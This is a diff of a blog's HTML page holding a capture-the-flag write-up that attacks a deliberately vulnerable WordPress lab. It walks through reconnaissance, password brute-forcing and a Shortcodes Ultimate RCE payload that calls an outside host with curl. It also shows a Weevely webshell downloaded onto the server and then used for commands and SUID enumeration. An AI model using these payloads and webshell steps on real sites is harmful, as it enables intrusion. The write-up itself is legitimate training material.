@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.92.1" />
+<meta name="generator" content="Hugo 0.121.2">
 
   <meta property="og:title" content="[CTF - Santhacklaus-2019] Survivall" />
 <meta property="og:description" content="" />
@@ -44,7 +44,6 @@
   <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
 
   
-  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
 
     
   
@@ -105,9 +104,9 @@
 	
 
     <h1 class="brand-title">Thibaud Robin</h1>
-    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">@Trackflaw</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity</p>
+    <p>Personnal (old) blog to speak about cybersecurity</p>
 
     <nav class="nav">
       <ul class="nav-list sidebar-list">
@@ -126,7 +125,7 @@
     <div class="social-buttons">
       
         
-        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        <a href="https://github.com/trackflaw" target="_blank"><i class='fab fa-github'></i></a>
         
       
         
@@ -142,7 +141,7 @@
         
       
         
-        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        <a href="https://twitter.com/trackflaw" target="_blank"><i class='fab fa-twitter'></i></a>
         
       
       
@@ -247,14 +246,14 @@
 <h1 id="step-1--perimeter-discovery">Step 1 : Perimeter discovery</h1>
 <h2 id="11-services">1.1. Services</h2>
 <p>We started this challenge with a classical services recon.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">PORT STATE SERVICE VERSION
-22/tcp closed ssh
-80/tcp open http Apache httpd 2.4.38
-| http-methods:
-|\_ Supported Methods: HEAD
-|\_http-title: Survive All The best survival tech guide
-Service Info: Host: 172.20.0.3
-</code></pre></div><p>2 ports seems available :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>PORT STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp closed ssh
+</span></span><span style="display:flex;"><span>80/tcp open http Apache httpd 2.4.38
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|\_ Supported Methods: HEAD
+</span></span><span style="display:flex;"><span>|\_http-title: Survive All The best survival tech guide
+</span></span><span style="display:flex;"><span>Service Info: Host: 172.20.0.3
+</span></span></code></pre></div><p>2 ports seems available :</p>
 <ul>
 <li>Closed TCP/22 which run SSH service</li>
 <li>Open TCP/80 which run HTTP service</li>
@@ -271,43 +270,43 @@ Service Info: Host: 172.20.0.3
 </div>
 <p><img src="/img/santhacklaus-2019/wappalyzer.png" alt=""></p>
 <p>It&rsquo;s possible to obtain many informations with the public tool <strong>Wpscan</strong>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">[+] http://survive-all.santhacklaus.xyz/
-| Interesting Entries:
-| - Server: Apache/2.4.38 (Debian)
-| - X-Powered-By: PHP/7.3.12
-|
-[+] http://survive-all.santhacklaus.xyz/xmlrpc.php
-|
-[+] http://survive-all.santhacklaus.xyz/readme.html
-|
-[+] http://survive-all.santhacklaus.xyz/wp-cron.php
-|
-[+] woocommerce
-| Location: http://survive-all.santhacklaus.xyz/wp-content/plugins/woocommerce/
-| Last Updated: 2019-11-27T19:11:00.000Z
-| [!] The version is out of date, the latest version is 3.8.1
-| Version: 3.3.0 (100% confidence)
-|
-[+] WordPress version 5.2.4 identified (Latest, released on 2019-10-14).
-| Found By: Rss Generator (Passive Detection) (http://survive-all.santhacklaus.xyz/?feed=rss2)
-|
-[+] WordPress theme in use: hestia
-| Readme: http://survive-all.santhacklaus.xyz/wp-content/themes/hestia/readme.txt
-| [!] The version is out of date, the latest version is 2.5.5
-| Version: 2.5.4
-|
-[i] User(s) Identified:
-|
-[+] admin
-[+] Gear Brills
-[+] dike
-[+] James Yestin
-[+] Tim Corcoran
-[+] tim-corcoran
-[+] gear-brills
-[+] steve-parker
-[+] james-yestin
-</code></pre></div><p>Severals informations have been revealed by the scanner :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>[+] http://survive-all.santhacklaus.xyz/
+</span></span><span style="display:flex;"><span>| Interesting Entries:
+</span></span><span style="display:flex;"><span>| - Server: Apache/2.4.38 (Debian)
+</span></span><span style="display:flex;"><span>| - X-Powered-By: PHP/7.3.12
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[+] http://survive-all.santhacklaus.xyz/xmlrpc.php
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[+] http://survive-all.santhacklaus.xyz/readme.html
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[+] http://survive-all.santhacklaus.xyz/wp-cron.php
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[+] woocommerce
+</span></span><span style="display:flex;"><span>| Location: http://survive-all.santhacklaus.xyz/wp-content/plugins/woocommerce/
+</span></span><span style="display:flex;"><span>| Last Updated: 2019-11-27T19:11:00.000Z
+</span></span><span style="display:flex;"><span>| [!] The version is out of date, the latest version is 3.8.1
+</span></span><span style="display:flex;"><span>| Version: 3.3.0 (100% confidence)
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[+] WordPress version 5.2.4 identified (Latest, released on 2019-10-14).
+</span></span><span style="display:flex;"><span>| Found By: Rss Generator (Passive Detection) (http://survive-all.santhacklaus.xyz/?feed=rss2)
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[+] WordPress theme in use: hestia
+</span></span><span style="display:flex;"><span>| Readme: http://survive-all.santhacklaus.xyz/wp-content/themes/hestia/readme.txt
+</span></span><span style="display:flex;"><span>| [!] The version is out of date, the latest version is 2.5.5
+</span></span><span style="display:flex;"><span>| Version: 2.5.4
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[i] User(s) Identified:
+</span></span><span style="display:flex;"><span>|
+</span></span><span style="display:flex;"><span>[+] admin
+</span></span><span style="display:flex;"><span>[+] Gear Brills
+</span></span><span style="display:flex;"><span>[+] dike
+</span></span><span style="display:flex;"><span>[+] James Yestin
+</span></span><span style="display:flex;"><span>[+] Tim Corcoran
+</span></span><span style="display:flex;"><span>[+] tim-corcoran
+</span></span><span style="display:flex;"><span>[+] gear-brills
+</span></span><span style="display:flex;"><span>[+] steve-parker
+</span></span><span style="display:flex;"><span>[+] james-yestin
+</span></span></code></pre></div><p>Severals informations have been revealed by the scanner :</p>
 <ul>
 <li>PHP version is available in the server header.</li>
 <li><code>xmlrpc.php</code> file is available.</li>
@@ -329,33 +328,33 @@ Service Info: Host: 172.20.0.3
 </div>
 <h2 id="13-plugins-bruteforcing">1.3. Plugins bruteforcing</h2>
 <p>During the tests, I was not really satisfied by the result found. So I launched a bruteforce attack with the following wordlist to obtained more plugins : <a href="http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt">http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ./wfuzz -w ~/dictionaries/wp-plugins.txt --hc <span style="color:#ae81ff">404</span> http://survive-all.santhacklaus.xyz/wp-content/plugins/FUZZ
-
-<span style="color:#f92672">===================================================================</span>
-ID           Response   Lines    Word     Chars       Payload
-<span style="color:#f92672">===================================================================</span>
-
-000000071:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">293</span> Ch      <span style="color:#e6db74">&#34;akismet&#34;</span>
-000000564:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">389</span> Ch      <span style="color:#e6db74">&#34;import-users-from-csv-with-meta&#34;</span>
-000000587:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">365</span> Ch      <span style="color:#e6db74">&#34;jetpack&#34;</span>
-000000654:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">383</span> Ch      <span style="color:#e6db74">&#34;mailchimp-for-woocommerce&#34;</span>
-000000667:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">371</span> Ch      <span style="color:#e6db74">&#34;master-slider&#34;</span>
-000000701:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">367</span> Ch      <span style="color:#e6db74">&#34;ml-slider&#34;</span>
-000000944:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">377</span> Ch      <span style="color:#e6db74">&#34;shortcodes-ultimate&#34;</span>
-000001003:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">372</span> Ch      <span style="color:#e6db74">&#34;smart-slider-3&#34;</span>
-000001093:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">377</span> Ch      <span style="color:#e6db74">&#34;themeisle-companion&#34;</span>
-000001095:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">372</span> Ch      <span style="color:#e6db74">&#34;theme-my-login&#34;</span>
-000001216:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">369</span> Ch      <span style="color:#e6db74">&#34;woocommerce&#34;</span>
-000001252:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">378</span> Ch      <span style="color:#e6db74">&#34;woocommerce-services&#34;</span>
-000001328:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">370</span> Ch      <span style="color:#e6db74">&#34;wpforms-lite&#34;</span>
-000001406:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">369</span> Ch      <span style="color:#e6db74">&#34;wp-rollback&#34;</span>
-</code></pre></div><p>Great ! It&rsquo;s better. Theses plugins have been checked later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ./wfuzz -w ~/dictionaries/wp-plugins.txt --hc <span style="color:#ae81ff">404</span> http://survive-all.santhacklaus.xyz/wp-content/plugins/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word     Chars       Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000071:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">293</span> Ch      <span style="color:#e6db74">&#34;akismet&#34;</span>
+</span></span><span style="display:flex;"><span>000000564:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">389</span> Ch      <span style="color:#e6db74">&#34;import-users-from-csv-with-meta&#34;</span>
+</span></span><span style="display:flex;"><span>000000587:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">365</span> Ch      <span style="color:#e6db74">&#34;jetpack&#34;</span>
+</span></span><span style="display:flex;"><span>000000654:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">383</span> Ch      <span style="color:#e6db74">&#34;mailchimp-for-woocommerce&#34;</span>
+</span></span><span style="display:flex;"><span>000000667:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">371</span> Ch      <span style="color:#e6db74">&#34;master-slider&#34;</span>
+</span></span><span style="display:flex;"><span>000000701:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">367</span> Ch      <span style="color:#e6db74">&#34;ml-slider&#34;</span>
+</span></span><span style="display:flex;"><span>000000944:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">377</span> Ch      <span style="color:#e6db74">&#34;shortcodes-ultimate&#34;</span>
+</span></span><span style="display:flex;"><span>000001003:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">372</span> Ch      <span style="color:#e6db74">&#34;smart-slider-3&#34;</span>
+</span></span><span style="display:flex;"><span>000001093:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">377</span> Ch      <span style="color:#e6db74">&#34;themeisle-companion&#34;</span>
+</span></span><span style="display:flex;"><span>000001095:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">372</span> Ch      <span style="color:#e6db74">&#34;theme-my-login&#34;</span>
+</span></span><span style="display:flex;"><span>000001216:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">369</span> Ch      <span style="color:#e6db74">&#34;woocommerce&#34;</span>
+</span></span><span style="display:flex;"><span>000001252:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">378</span> Ch      <span style="color:#e6db74">&#34;woocommerce-services&#34;</span>
+</span></span><span style="display:flex;"><span>000001328:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">370</span> Ch      <span style="color:#e6db74">&#34;wpforms-lite&#34;</span>
+</span></span><span style="display:flex;"><span>000001406:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W     <span style="color:#ae81ff">369</span> Ch      <span style="color:#e6db74">&#34;wp-rollback&#34;</span>
+</span></span></code></pre></div><p>Great ! It&rsquo;s better. Theses plugins have been checked later.</p>
 <h2 id="14-account-informations-gathering">1.4. Account informations gathering</h2>
 <p>A page on the application indicated somes usernames.</p>
 <p><img src="/img/santhacklaus-2019/screen-5-5.png" alt=""></p>
 <p>A other page indicated that partner of survive-all are <em>cuttingedge</em> and <em>flyingeagle</em> company. The page also gave us an email format (for account bruteforce ?).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">For our partners cuttingedge.com and flyringeagle.com, don’t forget the contributor access we created for your members a while back. You can use your credentials to upload some valuable content on this platform
-</code></pre></div><p><img src="/img/santhacklaus-2019/screen-5.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>For our partners cuttingedge.com and flyringeagle.com, don’t forget the contributor access we created for your members a while back. You can use your credentials to upload some valuable content on this platform
+</span></span></code></pre></div><p><img src="/img/santhacklaus-2019/screen-5.png" alt=""></p>
 <h2 id="15-default-password">1.5. Default password</h2>
 <p>A page leaked informations about user credentials. Apparently, user password have the specific format : <code>@@MonthYear@@</code></p>
 <p><img src="/img/santhacklaus-2019/screen-1.png" alt=""></p>
@@ -391,14 +390,14 @@ j.yestin@cuttingedge.com
 </code></pre><h2 id="23-valid-credentials">2.3. Valid credentials</h2>
 <p>The login form was not protected against bruteforce attack. Then, we have bruteforced password for the emails previously obtained.</p>
 <p>Here is a little python script to generate a nice wordlists.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> datetime
-
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>):
-    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2012</span>, <span style="color:#ae81ff">2020</span>):
-        password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@@&#34;</span> <span style="color:#f92672">+</span> datetime<span style="color:#f92672">.</span>date(<span style="color:#ae81ff">2015</span>, i, <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#39;%B&#39;</span>)
-        password <span style="color:#f92672">+=</span> str(j) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@@&#34;</span>
-        print(password)
-</code></pre></div><p>And Burp Pro intruder did all the work !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">13</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2012</span>, <span style="color:#ae81ff">2020</span>):
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@@&#34;</span> <span style="color:#f92672">+</span> datetime<span style="color:#f92672">.</span>date(<span style="color:#ae81ff">2015</span>, i, <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#39;%B&#39;</span>)
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">+=</span> str(j) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@@&#34;</span>
+</span></span><span style="display:flex;"><span>        print(password)
+</span></span></code></pre></div><p>And Burp Pro intruder did all the work !</p>
 <p><img src="/img/santhacklaus-2019/screen-9.png" alt=""></p>
 <p>This technique permited to found s.parker password.</p>
 <p><code>s.parker@cuttingedge.com:@@January2018@@</code></p>
@@ -408,16 +407,16 @@ j.yestin@cuttingedge.com
     
     </p>
 </div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">[th1b4ud@th1b4ud-pc]\$ wpscan --url http://survive-all.santhacklaus.xyz -U &#34;s.parker@cuttingedge.com&#34; -P wordlist-pwd.txt
-
-[+] Performing password attack on Xmlrpc against 1 user/s
-[SUCCESS] - s.parker@cuttingedge.com / @@January2018@@
-
-Trying s.parker@cuttingedge.com / @@January2019@@ Time: 00:00:00 - (10 / 10) 100.00% Time: 00:00:00
-
-[i] Valid Combinations Found:
-| Username: s.parker@cuttingedge.com, Password: @@January2018@@
-</code></pre></div><p>WPScan is really a nice tool !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>[th1b4ud@th1b4ud-pc]\$ wpscan --url http://survive-all.santhacklaus.xyz -U &#34;s.parker@cuttingedge.com&#34; -P wordlist-pwd.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Performing password attack on Xmlrpc against 1 user/s
+</span></span><span style="display:flex;"><span>[SUCCESS] - s.parker@cuttingedge.com / @@January2018@@
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Trying s.parker@cuttingedge.com / @@January2019@@ Time: 00:00:00 - (10 / 10) 100.00% Time: 00:00:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[i] Valid Combinations Found:
+</span></span><span style="display:flex;"><span>| Username: s.parker@cuttingedge.com, Password: @@January2018@@
+</span></span></code></pre></div><p>WPScan is really a nice tool !</p>
 <p><img src="/img/santhacklaus-2019/screen-10.png" alt=""></p>
 <p>Theses credentials permitted to obtain an access as <strong>Steve Parker</strong>. This access also permitted to read the secret notes.</p>
 <p><img src="/img/santhacklaus-2019/screen-11.png" alt=""></p>
@@ -427,8 +426,8 @@ Trying s.parker@cuttingedge.com / @@January2019@@ Time: 00:00:00 - (10 / 10) 100
 <p>The exploit is pretty simple. We tried it on a new article.</p>
 <p><img src="/img/santhacklaus-2019/screen-15.png" alt=""></p>
 <p>Payload :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">[su_meta key=1 post_id=1 default=&#39;curl http://1.2.3.4:4444/RCE!!!&#39; filter=&#39;system&#39;]
-</code></pre></div><p><img src="/img/santhacklaus-2019/screen-16.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>[su_meta key=1 post_id=1 default=&#39;curl http://1.2.3.4:4444/RCE!!!&#39; filter=&#39;system&#39;]
+</span></span></code></pre></div><p><img src="/img/santhacklaus-2019/screen-16.png" alt=""></p>
 <p>Perfect ! So beautiful ! The remote server reached our computer. Our commands have been correctly executed.</p>
 <h2 id="31-webshell-creation">3.1. Webshell creation</h2>
 <p>The basic RCE was really unconfortable. So we&rsquo;ve created a webshell with <strong>Weevely</strong> !</p>
@@ -439,74 +438,74 @@ Trying s.parker@cuttingedge.com / @@January2019@@ Time: 00:00:00 - (10 / 10) 100
     </p>
 </div>
 <p>If you haven&rsquo;t develop your own webshell, you can use Weevely webshell project. No more reason to use c99 malware shell PLEASE (yeah please no more of this s**t !!!) :(</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc weevely3<span style="color:#f92672">]</span>$ ./weevely.py generate teachunbequatreude_password agent.php
-Generated <span style="color:#e6db74">&#39;agent.php&#39;</span> with password <span style="color:#e6db74">&#39;teachunbequatreude_password&#39;</span> of <span style="color:#ae81ff">742</span> byte size.
-</code></pre></div><p>We generated a webshell <code>agent.php</code> with password : <code>teachunbequatreude_password</code> (yeah I know it&rsquo;s a weak password, have you tried it on the CTFd platform ? :D). All we have to do is to upload it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">[su_meta key=1 post_id=1 default=&#39;curl http://1.2.3.4:4444/agent.php -o wp-content/uploads/3e5t12e.php&#39; filter=&#39;system&#39;]
-</code></pre></div><p><img src="/img/santhacklaus-2019/screen-16-4.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc weevely3<span style="color:#f92672">]</span>$ ./weevely.py generate teachunbequatreude_password agent.php
+</span></span><span style="display:flex;"><span>Generated <span style="color:#e6db74">&#39;agent.php&#39;</span> with password <span style="color:#e6db74">&#39;teachunbequatreude_password&#39;</span> of <span style="color:#ae81ff">742</span> byte size.
+</span></span></code></pre></div><p>We generated a webshell <code>agent.php</code> with password : <code>teachunbequatreude_password</code> (yeah I know it&rsquo;s a weak password, have you tried it on the CTFd platform ? :D). All we have to do is to upload it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>[su_meta key=1 post_id=1 default=&#39;curl http://1.2.3.4:4444/agent.php -o wp-content/uploads/3e5t12e.php&#39; filter=&#39;system&#39;]
+</span></span></code></pre></div><p><img src="/img/santhacklaus-2019/screen-16-4.png" alt=""></p>
 <p>Done !</p>
 <p>Weevely webshell is really simple to use.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">[th1b4ud@th1b4ud-pc weevely3]\$ ./weevely.py http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php teachunbequatreude_password
-
-[+] Weevely 3.7.0
-
-[+] Target: survive-all.santhacklaus.xyz
-[+] Session: /home/th1b4ud/.Weevely/sessions/survive-all.santhacklaus.xyz/3e5t12e_0.session
-
-[+] Browse the filesystem or execute commands starts the connection
-[+] to the target. Type :help for more information.
-
-Weevely&gt; id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre></div><p>The power of this tool comes from all its features. On this challenge, normal reverse shell weren&rsquo;t working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : <code>:backdoor_reversetcp</code> (yeah I know, this name s**k so much) :'(</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>[th1b4ud@th1b4ud-pc weevely3]\$ ./weevely.py http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php teachunbequatreude_password
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Weevely 3.7.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Target: survive-all.santhacklaus.xyz
+</span></span><span style="display:flex;"><span>[+] Session: /home/th1b4ud/.Weevely/sessions/survive-all.santhacklaus.xyz/3e5t12e_0.session
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Browse the filesystem or execute commands starts the connection
+</span></span><span style="display:flex;"><span>[+] to the target. Type :help for more information.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Weevely&gt; id
+</span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>The power of this tool comes from all its features. On this challenge, normal reverse shell weren&rsquo;t working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : <code>:backdoor_reversetcp</code> (yeah I know, this name s**k so much) :'(</p>
 <p><img src="/img/santhacklaus-2019/screen-16-4-5.png" alt=""></p>
 <p>Weevely also have a module to enumerates suid/guid binaries to prepare your privilege escalation !</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">www-data@081256f7edc3:/var/www/html/wp-content/uploads \$ :audit_suidsgid /
-+---------------------------------------------+
-| /usr/bin/passwd |
-| /usr/bin/gpasswd |
-| /usr/bin/wall |
-| /usr/bin/newgrp |
-| /usr/bin/chage |
-| /usr/bin/chsh |
-| /usr/bin/expiry |
-| /usr/bin/chfn |
-| /usr/bin/ssh-agent |
-| /usr/local/share/fonts |
-| /usr/local/bin/sudo |
-| /usr/lib/dbus-1.0/dbus-daemon-launch-helper |
-| /usr/lib/openssh/ssh-keysign |
-| /var/mail |
-| /var/local |
-| /bin/su |
-| /bin/umount |
-| /bin/mount |
-| /opt/gather_todos_wrapper |
-| /sbin/unix_chkpwd |
-+---------------------------------------------+
-</code></pre></div><h2 id="32-bdd-creds">3.2. Bdd creds</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>www-data@081256f7edc3:/var/www/html/wp-content/uploads \$ :audit_suidsgid /
+</span></span><span style="display:flex;"><span>+---------------------------------------------+
+</span></span><span style="display:flex;"><span>| /usr/bin/passwd |
+</span></span><span style="display:flex;"><span>| /usr/bin/gpasswd |
+</span></span><span style="display:flex;"><span>| /usr/bin/wall |
+</span></span><span style="display:flex;"><span>| /usr/bin/newgrp |
